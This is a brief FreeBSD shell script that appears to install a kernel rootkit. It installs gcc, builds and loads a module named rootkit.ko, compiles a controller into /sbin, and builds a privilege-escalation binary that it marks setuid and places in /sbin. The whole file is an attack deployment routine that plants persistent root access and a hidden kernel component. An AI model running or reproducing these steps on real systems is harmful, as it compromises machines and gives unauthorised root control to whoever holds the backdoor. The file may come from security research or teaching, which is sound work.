#!/bin/sh

pkg install lang/gcc
make
kldload ./rootkit.ko
gcc controller.c -o /sbin/controller
gcc priv_esc.c -o priv_esc
chmod +s priv_esc
mv priv_esc /sbin/priv_esc
